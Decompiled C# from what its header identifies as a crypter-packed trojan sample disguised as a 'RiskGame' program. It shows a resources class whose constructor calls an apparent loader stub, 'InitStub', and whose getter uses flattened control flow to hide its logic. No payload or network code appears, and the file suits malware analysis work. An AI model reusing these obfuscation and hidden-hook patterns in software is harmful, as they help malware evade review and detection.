// Decompiled with JetBrains decompiler
// Type: RiskGame.Properties.Resources
// Assembly: IEnumUnkn, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: FA80F1E7-116A-4A8E-96EA-FFB7A6C2BB6E
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Crypt.gen-4e20a72f2791a602f8ee9999765a9365729ff929da4d5fa6be7bfb4c20e9989e.exe

using IEnumUnkn.Structs;
using System.CodeDom.Compiler;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Globalization;
using System.Resources;
using System.Runtime.CompilerServices;

namespace RiskGame.Properties
{
  [CompilerGenerated]
  [GeneratedCode("System.Resources.Tools.StronglyTypedResourceBuilder", "16.0.0.0")]
  [DebuggerNonUserCode]
  public class Resources
  {
    private static ResourceManager _Token;
    private static CultureInfo _Prototype;

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal Resources()
    {
      ListenerManager.InitStub();
      // ISSUE: explicit constructor call
      base.\u002Ector();
    }

    [EditorBrowsable(EditorBrowsableState.Advanced)]
    public static ResourceManager LogoutField
    {
      [MethodImpl(MethodImplOptions.NoInlining)] get
      {
        int num1 = 5;
        ResourceManager token;
        while (true)
        {
          ResourceManager resourceManager;
          int num2;
          bool flag;
          switch (num1)
          {
            case 0:
            case 5:
label_9:
              flag = RiskGame.Properties.Resources._Token == null;
              num2 = 2;
              break;
            case 1:
            case 2:
              if (flag)
              {
                resourceManager = new ResourceManager("RiskGame.Properties.Resources", typeof (RiskGame.Properties.Resources).Assembly);
                num2 = 3;
                break;
              }
              goto label_8;
            case 3:
              RiskGame.Properties.Resources._Token = resourceManager;
              goto case 4;
            case 4:
              goto label_8;
            case 6:
              goto label_10;
            default:
              num2 = 4;
              break;
          }
          num1 = num2;
          continue;
label_8:
          token = RiskGame.Properties.Resources._Token;
          if (RiskGame.Properties.Resources.ListObject())
            num1 = 6;
          else
            goto label_9;
        }
label_10:
        return token;
      }
    }

    [EditorBrowsable(EditorBrowsableState.Advanced)]
    public static CultureInfo CheckField
    {
      [MethodImpl(MethodImplOptions.NoInlining)] get => RiskGame.Properties.Resources._Prototype;
      [MethodImpl(MethodImplOptions.NoInlining)] set => RiskGame.Properties.Resources._Prototype = value;
    }

    [SpecialName]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public static Bitmap ValidateField() => (Bitmap) RiskGame.Properties.Resources.LogoutField.GetObject("RegistryKeyPermissionCh", RiskGame.Properties.Resources._Prototype);

    internal static bool ListObject() => true;

    internal static bool InterruptObject() => false;
  }
}
